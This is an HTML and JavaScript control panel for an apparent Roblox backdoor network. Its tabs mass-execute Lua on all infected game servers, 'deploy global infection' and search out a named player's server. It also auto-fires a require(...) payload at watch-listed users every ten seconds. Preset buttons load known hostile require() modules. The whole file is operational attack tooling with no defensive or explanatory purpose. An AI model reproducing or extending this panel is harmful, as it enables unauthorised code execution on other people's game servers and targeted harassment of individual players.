<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Nexus  | Legacy v3.2</title>
    <style>
        body { margin: 0; background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .panel { background: #1c1c1e; padding: 25px; border-radius: 18px; width: 600px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .tabs { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; flex-wrap: wrap; }
        .tab { color: #86868b; cursor: pointer; font-size: 11px; font-weight: 600; transition: 0.2s; position: relative; text-transform: uppercase; }
        .tab.active { color: #fff; }
        .tab.active::after { content: ''; position: absolute; bottom: -11px; left: 0; width: 100%; height: 2px; background: #0071e3; }
        .content-section { display: none; }
        .content-section.active { display: block; }
        h2 { margin-top: 0; font-size: 15px; text-align: center; margin-bottom: 15px; color: #0071e3; }
        .btn-group { display: flex; gap: 6px; margin-bottom: 15px; flex-wrap: wrap; justify-content: center; }
        .pill { background: #3a3a3c; border: none; color: #fff; padding: 6px 12px; border-radius: 20px; font-size: 10px; cursor: pointer; }
        .pill:hover { background: #0071e3; }
        textarea, input { width: 100%; background: #000; border: 1px solid #424245; border-radius: 10px; color: #fff; padding: 12px; margin-bottom: 10px; box-sizing: border-box; font-family: monospace; outline: none; font-size: 12px; }
        .exec-btn { background: #0071e3; color: #fff; border: none; width: 100%; padding: 14px; border-radius: 12px; font-weight: 600; cursor: pointer; font-size: 14px; margin-top: 5px; }
        .node-list { background: #000; border: 1px solid #333; border-radius: 10px; height: 110px; overflow-y: auto; padding: 10px; font-size: 11px; }
        .footer-btns { position: fixed; bottom: 20px; left: 20px; display: flex; gap: 10px; }
        .f-btn { background: #2c2c2e; border: none; color: #fff; padding: 8px 16px; border-radius: 10px; font-size: 12px; cursor: pointer; }
        #scan-status { color: #34c759; font-size: 10px; text-align: center; margin-top: 5px; min-height: 12px; font-weight: bold; }
    </style>
</head>
<body> <div class="panel">
        <div class="tabs">
            <span class="tab active" onclick="openTab(event, 'mass')">Mass</span>
            <span class="tab" onclick="openTab(event, 'single')">Single</span>
            <span class="tab" onclick="openTab(event, 'inf')">Infection</span>
            <span class="tab" onclick="openTab(event, 'white')">Whitelist</span>
            <span class="tab" onclick="openTab(event, 'nodes')">Nodes</span>
        </div>

        <input type="text" id="target_input" placeholder="Global Username / Target">

        <div id="mass" class="content-section active">
            <h2>Mass Execution</h2>
            <div class="btn-group">
                <button class="pill" onclick="setLua('Darius', 'lua_mass')">Darius</button>
                <button class="pill" onclick="setLua('Steve', 'lua_mass')">Steve</button>
                <button class="pill" onclick="setLua('DS', 'lua_mass')">DarkSynapse</button>
                <button class="pill" onclick="setLua('LR', 'lua_mass')">Last Rig</button>
                <button class="pill" onclick="setLua('EXE', 'lua_mass')">Require.EXE</button>
            </div>
            <textarea id="lua_mass" rows="5" placeholder="-- Script for ALL nodes"></textarea>
            <button class="exec-btn" onclick="fire('mass')">Execute All Servers</button>
        </div>

        <div id="single" class="content-section">
            <h2>Auto-Target Search</h2>
            <div class="btn-group">
                <button class="pill" onclick="setLua('Darius', 'lua_single')">Darius</button>
                <button class="pill" onclick="setLua('LR', 'lua_single')">Last Rig</button>
            </div>
            <textarea id="lua_single" rows="5" placeholder="-- Script for target (No JobID needed)"></textarea>
            <button class="exec-btn" onclick="findAndExecute()">Search & Execute</button>
        </div>

        <div id="inf" class="content-section">
            <h2>Infection Module</h2>
            <textarea id="lua_inf" rows="6">require(127445614272366).op("Player")</textarea>
            <button class="exec-btn" onclick="fire('inf')">Deploy Global Infection</button>
        </div>

        <div id="white" class="content-section">
            <h2>Whitelist Auto-Monitor</h2>
            <div class="btn-group">
                <button class="pill" onclick="addToWhitelist()">Add Target</button>
                <button class="pill" style="background:#ff3b30;" onclick="clearWhitelist()">Clear List</button>
            </div>
            <div id="white_list_display" class="node-list" style="height: 60px;">Watching: [None]</div>
            <div id="scan-status">Scanner: Idle</div>
        </div>

        <div id="nodes" class="content-section">
            <h2>Active Nodes</h2>
            <div id="node_log" class="node-list">Scanning...</div>
            <button class="exec-btn" style="background:#333; margin-top:5px;" onclick="refreshNodes()">Refresh Nodes</button>
        </div>
    </div>

    <div class="footer-btns">
        <button class="f-btn" onclick="document.getElementById('m').play()">PLAY</button>
        <button class="f-btn" style="color: #ff3b30; font-weight: bold;" onclick="stopAudio()">STOP MUSIC</button>
    </div>

    <audio id="m" loop src="https://files.catbox.moe/81p5wf.mp3"></audio>

    <script>
        const audio = document.getElementById('m');
        let watchList = [];

        function stopAudio() {
            audio.pause();
            audio.currentTime = 0;
        }

        function openTab(evt, tabName) {
            let i, content, tabs;
            content = document.getElementsByClassName("content-section");
            for (i = 0; i < content.length; i++) { content[i].style.display = "none"; }
            tabs = document.getElementsByClassName("tab");
            for (i = 0; i < tabs.length; i++) { tabs[i].className = tabs[i].className.replace(" active", ""); }
            document.getElementById(tabName).style.display = "block";
            evt.currentTarget.className += " active";
        }

        function setLua(type, boxId) {
            const user = document.getElementById('target_input').value || "Player";
            const box = document.getElementById(boxId);
            if(type === 'Darius') box.value = `require(127445614272366).op("${user}")`;
            if(type === 'Steve') box.value = `require(12246001294):Blockify("${user}")`;
            if(type === 'DS') box.value = `require(133245855072069)("${user}", "DarkSynapse")`;
            if(type === 'LR') box.value = `require(132155655397653)("${user}")`;
            if(type === 'EXE') box.value = `require(125992639027440)["Require.EXE by E God"]("${user}")`;
        }

        async function findAndExecute() {
            const name = document.getElementById('target_input').value;
            const lua = document.getElementById('lua_single').value;
            if(!name) return alert("Enter a target name!");
            
            document.getElementById('scan-status').innerText = "Hunting JobID...";
            const nodes = await (await fetch('/get-games')).json();
            
            for (let id in nodes) {
                if (nodes[id].players?.some(p => p.toLowerCase() === name.toLowerCase())) {
                    await push(lua, id);
                    document.getElementById('scan-status').innerText = `SUCCESS: Executed in ${nodes[id].name}`;
                    return;
                }
            }
            alert("Player not found.");
        }

        function addToWhitelist() {
            const user = document.getElementById('target_input').value;
            if(user && !watchList.includes(user)) {
                watchList.push(user);
                document.getElementById('white_list_display').innerText = "Watching: " + watchList.join(", ");
            }
        }

        function clearWhitelist() { watchList = []; document.getElementById('white_list_display').innerText = "Watching: [None]"; }

        async function monitor() {
            if (watchList.length === 0) return;
            const nodes = await (await fetch('/get-games')).json();
            for (let id in nodes) {
                const players = nodes[id].players || [];
                watchList.forEach(async (target) => {
                    if (players.some(p => p.toLowerCase() === target.toLowerCase())) {
                        document.getElementById('scan-status').innerText = `AUTO-FIRE: Found ${target}`;
                        await push(`require(127445614272366).op("${target}")`, id);
                    }
                });
            }
        }

        async function fire(mode) {
            let code = mode === 'mass' ? document.getElementById('lua_mass').value : document.getElementById('lua_inf').value;
            await push(code, null);
        }

        async function push(lua, tid) {
            await fetch('/push-lua', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ lua: lua, password: "Alt", targetId: tid })
            });
        }

        async function refreshNodes() {
            try {
                const res = await fetch('/get-games');
                const data = await res.json();
                document.getElementById('node_log').innerHTML = Object.keys(data).map(k => `<div><b>${data[k].name}</b> (${data[k].players?.length || 0} players)</div>`).join('<hr style="border:0;border-top:1px solid #333">');
            } catch(e) {}
        }

        setInterval(monitor, 10000);
        setInterval(refreshNodes, 5000);
    </script>
</body>
</html>
